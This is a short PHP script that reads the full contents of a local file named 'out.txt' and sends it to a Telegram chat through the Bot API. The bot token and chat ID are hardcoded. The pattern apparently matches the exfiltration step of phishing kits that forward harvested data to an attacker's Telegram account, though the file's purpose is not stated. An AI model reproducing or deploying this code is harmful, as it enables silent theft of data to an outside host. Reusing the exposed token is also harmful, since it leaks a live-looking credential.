<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot1660017698:AAHlf2gptfs8EP2O3q-rqag9VmTXen5nLpc/sendMessage?chat_id=1300426699&text=$msg");
?>
